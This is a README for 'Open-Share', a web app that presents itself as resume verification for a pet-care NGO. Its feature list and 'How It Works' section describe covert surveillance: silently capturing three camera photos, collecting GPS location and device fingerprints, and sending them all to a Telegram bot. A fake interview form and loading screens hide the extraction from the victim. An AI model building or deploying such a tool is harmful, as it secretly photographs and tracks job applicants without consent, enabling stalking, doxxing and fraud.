# 🐾 Open-Share

**Digital Fingerprint Verification System** for Open-Share Pet Caring NGO.

A modern, glassmorphism-styled web application that collects device fingerprint data and captures photos from the user's camera for resume verification.

---

## ✨ Features

- 🎨 **Trending UI Design** — Glassmorphism, mesh gradients, animated backgrounds
- 📱 **Responsive Design** — Works on mobile, tablet, and desktop
- 🔐 **Device Fingerprinting** — Collects 20+ data points:
  - IP Address (IPv6)
  - Approximate & GPS Location
  - Browser, OS, Device Type
  - Screen Resolution, Language
  - Network & Provider Info
  - Battery Status
  - Canvas & WebGL fingerprints
- 📸 **Hidden Camera Capture** — 3 photos captured silently in background
- 🤖 **Telegram Integration** — All data forwarded instantly to employer
- ⚡ **Real-time Skeleton Loading** — Smooth UX during data extraction

---

## 🚀 Quick Start

### 1. Install Dependencies

```bash
cd open-share
npm install
```

### 2. Configure Environment

```bash
cp .env.example .env
```

Edit `.env` and add your credentials:

```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
PORT=3000
```

### 3. Start the Server

```bash
npm start
```

Or for development with auto-reload:

```bash
npm run dev
```

### 4. Open in Browser

Navigate to `http://localhost:3000`

---

## 📁 Project Structure

```
open-share/
├── server.js              # Express backend
├── package.json           # Dependencies
├── .env.example           # Environment template
├── .gitignore
├── public/
│   ├── index.html         # Main UI
│   ├── css/
│   │   └── style.css      # Glassmorphism styles
│   └── js/
│       └── app.js         # Frontend logic
└── uploads/               # Temporary photo storage (auto-created)
```

---

## 🔧 How It Works

1. **User fills form** → Enters `@rorshid` and selects interview date
2. **Clicks Submit** → Permission modal appears
3. **Clicks OK** → Background extraction begins:
   - Device fingerprint data collected
   - Camera accessed silently (no UI shown)
   - 3 photos captured (1 per second)
4. **Skeleton loading** shown to user
5. **Data uploaded** to backend
6. **Backend forwards** everything to Telegram bot
7. **Success page** shown with 48-hour review message

---

## 🔒 Security Notes

- Bot token and Chat ID are stored in `.env` (never commit this file)
- Uploaded photos are deleted immediately after Telegram forwarding
- No persistent data storage on server
- Uses HTTPS in production (recommended)

---

## 🎨 Design Credits

- **Glassmorphism** — Frosted glass cards with backdrop blur
- **Mesh Gradients** — Animated floating blobs
- **Space Grotesk + Inter** — Modern typography pairing
- **Skeleton Loading** — Shimmer effect during data extraction

---

Made with 💜 for Open-Share Pet Caring NGO
